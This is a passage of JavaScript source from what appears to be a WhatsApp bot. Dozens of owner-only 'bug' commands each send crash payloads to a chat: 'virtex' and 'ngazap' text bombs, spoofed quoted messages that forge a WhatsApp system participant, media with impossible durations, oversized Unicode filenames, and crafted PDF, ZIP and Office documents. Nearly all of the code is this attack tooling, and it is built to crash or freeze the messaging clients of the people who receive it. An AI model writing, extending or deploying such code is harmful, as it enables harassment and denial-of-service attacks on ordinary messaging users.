if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv7 = `${q}
${virtex7}${ngazapv2}`
xdev.sendMessage(from, { text: bugv7 }, {quoted: bugquoted}) 
break
case 'bugv8':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv8 = `${q}
${virtex8}${ngazapv2}`
xdev.sendMessage(from, { text: bugv8 }, {quoted: bugquoted}) 
break
case 'bugv9':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv9 = `${q}
${virtex9}${ngazapv2}`
xdev.sendMessage(from, { text: bugv9 }, {quoted: bugquoted}) 
break
case 'bugv10':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv10 = `${q}
${virtex10}${ngazapv2}`
xdev.sendMessage(from, { text: bugv10 }, {quoted: bugquoted}) 
break
case 'bugv11':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv11 = `${q}
${virtex11}${ngazapv2}`
xdev.sendMessage(from, { text: bugv11 }, {quoted: bugquoted}) 
break
case 'bugv12':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv12 = `${q}
${virtex12}${ngazapv2}`
xdev.sendMessage(from, { text: bugv12 }, {quoted: bugquoted}) 
break
case 'bugv13':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv13 = `${q}
${virtag}${ngazapv2}`
xdev.sendMessage(from, { text: bugv13 }, {quoted: bugquoted}) 
break
case 'bugv14':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv14 = `${q}
${ngazapv1}${ngazapv2}`
xdev.sendMessage(from, { text: bugv14 }, {quoted: bugquoted}) 
break
case 'bugv15':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv15 = `📄.${q}                                                            📄.${q}@                                                                  
${ngazapv2}${ngazapv2}`
xdev.sendMessage(from, { text: bugv15 }, {quoted: bugquoted}) 
break
case 'bugv16':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!q) return reply(`Teks?`)
const bugv16 = `${q}
${ngazapv3}${ngazapv2}`
xdev.sendMessage(from, { text: bugv16 }, {quoted: bugquoted}) 
break
case 'buggifv1': 
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
const nicko1 = await getBuffer(`https://k.top4top.io/p_2308coo9s0.gif`)
xdev.sendMessage(from, { video: nicko1, caption: `${virtex8}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'buggifv2': 	
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
const nicko2 = await getBuffer(`https://l.top4top.io/p_2308xkefe1.gif`)
xdev.sendMessage(from, { video: nicko2, caption: `${ngazapv1}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'buggifv3': 	
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
const nicko3 = await getBuffer(`https://a.top4top.io/p_2308qr4372.gif`)
xdev.sendMessage(from, { video: nicko3, caption: `${ngazapv2}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'buggifv4': 	
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
const nicko4 = await getBuffer(`https://b.top4top.io/p_23083wxa33.gif`)
xdev.sendMessage(from, { video: nicko4, caption: `${ngazapv3}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'buggifv5': 	
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
const nicko5 = await getBuffer(`https://a.top4top.io/m_2363ady120.mp4`)
xdev.sendMessage(from, { video: nicko5, caption: `${virtex7}`,gifPlayback: true},{quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'bugcatalogv1': case 'bugkatalogv1':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendKatalog(from, virtex8, virtex8, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'bugcatalogv2': case 'bugkatalogv2':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendKatalog(from, virtex8, ngazapv1, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'bugcatalogv3': case 'bugkatalogv3':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendKatalog(from, virtex8, ngazapv2, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'bugcatalogv4': case 'bugkatalogv4':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendKatalog(from, virtex8, ngazapv3, thumb, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
break
case 'virgamv1': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!isQuotedSticker) return reply('Reply stickernya')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
await xdev.sendMessage(from, {caption: `${ngazapv1}`, image: buffer}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
fs.unlinkSync(ran)
})
}
break
case 'virgamv2': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!isQuotedSticker) return reply('Reply stickernya')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
await xdev.sendMessage(from, {caption: `${ngazapv2}`, image: buffer}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
fs.unlinkSync(ran)
})
}
break
case 'virgamv3': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!isQuotedSticker) return reply('Reply stickernya')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
await xdev.sendMessage(from, {caption: `${ngazapv3}`, image: buffer}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
fs.unlinkSync(ran)
})
}
break
case 'virgamv4': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!isQuotedSticker) return reply('Reply stickernya')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
await xdev.sendMessage(from, {caption: `${virtex8}`, image: buffer}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
fs.unlinkSync(ran)
})
}
break
case 'virgamv5': {
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (!isQuotedSticker) return reply('Reply stickernya')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return reply(err)
let buffer = fs.readFileSync(ran)
await xdev.sendMessage(from, {caption: `${virtex7}`, image: buffer}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
fs.unlinkSync(ran)
})
}
break
case 'bugvideov1':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendMessage(from, { video: {url : `https://b.top4top.io/m_2308ob7y80.mp4`}, caption:`ꪶ𖣂ꫂ ${ngazapv3}.${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvideov2':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendMessage(from, { video: {url : `https://c.top4top.io/m_2308hp5um1.mp4`}, caption:`🎭么𝑻𝑵͢𝑴 𝑻𝛯𝛥𝑴⽳🎭\n${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvideov3':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendMessage(from, { video: {url : `https://d.top4top.io/m_2308utcfr2.mp4`}, caption:`${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvideov4':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendMessage(from, { video: {url : `https://e.top4top.io/m_2308k6low3.mp4`}, caption:`${pushname}\n${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvideov5':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendMessage(from, { video: {url : `https://a.top4top.io/m_2363ady120.mp4`}, caption:`${virtex8}\n${virtex8}`, mimetype: 'video/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvnv1':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendMessage(from, { audio: {url : `https://j.top4top.io/m_2319rrfpx1.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: bugquoted}) 
}
break
case 'bugvnv2':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendMessage(from, { audio: {url : `https://k.top4top.io/m_23192ur3s2.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvnv3':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendMessage(from, { audio: {url : `https://l.top4top.io/m_2319dp4v33.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvnv4':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendMessage(from, { audio: {url : `https://a.top4top.io/m_2319jp65p4.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugvnv5':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
xdev.sendMessage(from, { audio: {url : `https://l.top4top.io/m_2319xk12c0.mp3`}, mimetype: 'audio/mp4', duration: 359996400, ptt:true}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugstickv1':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugstickv1 = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_/1.webp')
xdev.sendMessage(from, {sticker: bugstickv1}, {quoted: bugquoted}) 
}
break
case 'bugstickv2':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugstickv2 = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_/2.webp')
xdev.sendMessage(from, {sticker: bugstickv2}, {quoted: bugquoted}) 
}
break
case 'bugstickv3':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugstickv3 = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_/3.webp')
xdev.sendMessage(from, {sticker: bugstickv3}, {quoted: bugquoted}) 
}
break
case 'bugstickv4':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugstickv4 = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_/4.webp')
xdev.sendMessage(from, {sticker: bugstickv4}, {quoted: bugquoted}) 
}
break
case 'bugstickv5':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugstickv5 = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_/5.webp')
xdev.sendMessage(from, {sticker: bugstickv5}, {quoted: bugquoted}) 
}
break
case 'bugaudiov1':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugaudiov1 = await getBuffer(`https://j.top4top.io/m_2319rrfpx1.mp3`)
xdev.sendMessage(from, {audio: bugaudiov1, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugaudiov2':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugaudiov2 = await getBuffer(`https://k.top4top.io/m_23192ur3s2.mp3`)
xdev.sendMessage(from, {audio: bugaudiov2, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugaudiov3':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugaudiov3 = await getBuffer(`https://l.top4top.io/m_2319dp4v33.mp3`)
xdev.sendMessage(from, {audio: bugaudiov3, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugaudiov4':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugaudiov4 = await getBuffer(`https://a.top4top.io/m_2319jp65p4.mp3`)
xdev.sendMessage(from, {audio: bugaudiov4, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugaudiov5':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugaudiov5 = await getBuffer(`https://l.top4top.io/m_2319xk12c0.mp3`)
xdev.sendMessage(from, {audio: bugaudiov5, mimetype: 'audio/mp4'}, {quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},message: { "extendedTextMessage": {"text": `${virtex8}`,"title": `${virtex8}`,'jpegThumbnail': thumb}}}})
}
break
case 'bugmamaco':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugmamaco = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_-/🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊🌞.‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏ ‎‏')
await xdev.sendMessage(from, { document: bugmamaco, mimetype: 'application/txt', fileName: `🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊🌞.${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugvk':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugvk = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_-/ꪷꪶ𝑽𝑲ꫂ ꪶ𝑻𝑯𝑬ꫂ ꪶ𝑲𝑰𝑵𝑮ꫂ . ꪶ底ꫂཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱཱྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀྀ')
await xdev.sendMessage(from, { document: bugvk, mimetype: 'application/txt', fileName: `ꪶ𝑽𝑲ꫂ ꪶ𝑻𝑯𝑬ꫂ ꪶ𝑲𝑰𝑵𝑮ꫂ . ${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugsunshine':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugsunshine = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_-/🌤⃟⃘༜᪶𝑪𝑳͜𝑬𝑰𝑻͜𝑰𝑵ネ̷ْ𝑺͜𝑼𝑵𝑺𝑯͜𝑰𝑵𝑬༜᪶⃟⃘☀️.ぼチㆨ𑲯𑲫𑲭𑲝𑲤𑲜𑲛𑲚𑲣𑲞𑲥')
await xdev.sendMessage(from, { document: bugsunshine, mimetype: 'application/txt', fileName: `🌤⃟⃘༜᪶𝑪𝑳͜𝑬𝑰𝑻͜𝑰𝑵ネ̷ْ𝑺͜𝑼𝑵𝑺𝑯͜𝑰𝑵𝑬༜᪶⃟⃘☀️.${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugsilver':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugsilver = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_-/😅࿆𑀁ᷓ𝀃⃬ꪲ༑ꪰ᷍💉ꪰ™S̸I̸L̸V̸E̸R̸Z̸I̸N̸G̸O̸D̸ • #T̺͆r̺͆o̺͆p̺͆a̺͆D̺͆o̺͆s̺͆G̺͆o̺͆d̺͆ 🤠࿆ᷓ⃟')
await xdev.sendMessage(from, { document: bugsilver, mimetype: 'application/txt', fileName: `😅࿆𑀁ᷓ𝀃⃬ꪲ༑ꪰ᷍💉ꪰ™S̸I̸L̸V̸E̸R̸Z̸I̸N̸G̸O̸D̸ • #T̺͆r̺͆o̺͆p̺͆a̺͆D̺͆o̺͆s̺͆G̺͆o̺͆d̺͆ 🤠࿆ᷓ${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'buggas':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let buggas = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_-/ᬉ🈀 🍩⇝͜͡✪ャ𐌾ձ𑂘𐌼оձձ𐐩𐔏ャ✪͜͡⇜🍩 🈀ᬉ͜.🍩ၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙၘၙ')
await xdev.sendMessage(from, { document: buggas, mimetype: 'application/txt', fileName: `ᬉ🈀 🍩⇝͜͡✪ャ𐌾ձ𑂘𐌼оձձ𐐩𐔏ャ✪͜͡⇜🍩 🈀ᬉ͜.🍩ၘ${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugcleitin':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugcleitin = fs.readFileSync('./ACTION/STORAGE/X-ABY/-_-/🥀࿙፝֟۫۫۫͝𝒄𝒍𝒆𝒊𝒕𝒊𝒏...𝀥🍷')
await xdev.sendMessage(from, { document: bugcleitin, mimetype: 'application/txt', fileName: `🥀࿙፝֟۫۫۫͝𝒄𝒍𝒆𝒊𝒕𝒊𝒏...𝀥🍷${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugpdf':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugpdf = fs.readFileSync('./ACTION/PLICE/DOCUMENT/doc.pdf')
await xdev.sendMessage(from, { document: bugpdf, mimetype: 'application/pdf', fileName: `${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugzip':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugzip = fs.readFileSync('./ACTION/PLICE/DOCUMENT/doc.zip')
await xdev.sendMessage(from, { document: bugzip, mimetype: 'application/zip', fileName: `${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugpptx':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugpptx = fs.readFileSync('./ACTION/PLICE/DOCUMENT/doc.pptx')
await xdev.sendMessage(from, { document: bugpptx, mimetype: 'application/pptx', fileName: `${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugxlsx':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugxlsx = fs.readFileSync('./ACTION/PLICE/DOCUMENT/doc.xlsx')
await xdev.sendMessage(from, { document: bugxlsx, mimetype: 'application/xlsx', fileName: `${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugdocx':{
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let bugdocx = fs.readFileSync('./ACTION/PLICE/DOCUMENT/doc.docx')
await xdev.sendMessage(from, { document: bugdocx, mimetype: 'application/docx', fileName: `${virtex8}` }, { quoted: bugquoted}) 
}
break
case 'bugbuttonv1':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let czyc = `🎭么𝑻𝑵͢𝑴 𝑻𝛯𝛥𝑴⽳🎭`
let butt = [
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv1}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv2}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv3}`},"type": "RESPONSE"}]
xdev.sendButLoc(from, czyc,fake,zreply,butt)
break
case 'bugbuttonv2':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let cxx = `${virtex8}`
let buttv = [
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv1}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv2}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv3}`},"type": "RESPONSE"}]
xdev.sendButLoc(from, cxx,fake,zreply,buttv)
break
case 'bugbuttonv3':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
let cvv = `${pushname}\n${virtex8}`
let buttx = [
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv1}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv2}`},"type": "RESPONSE"},
{"buttonId": `GFFFF`,"buttonText": {"displayText": `${ngazapv3}`},"type": "RESPONSE"}]
xdev.sendButLoc(from, cvv,fake,zreply,buttx)
break
case 'jadibugstick':
if (!isRegist) return onlyRegist()
if (isBaned) return onlyBan() 
if (!isOwner) return onlyOwner()
if (isImage || isQuotedImage) {
try{
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = await xdev.downloadAndSaveMediaMessage(quoted)
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
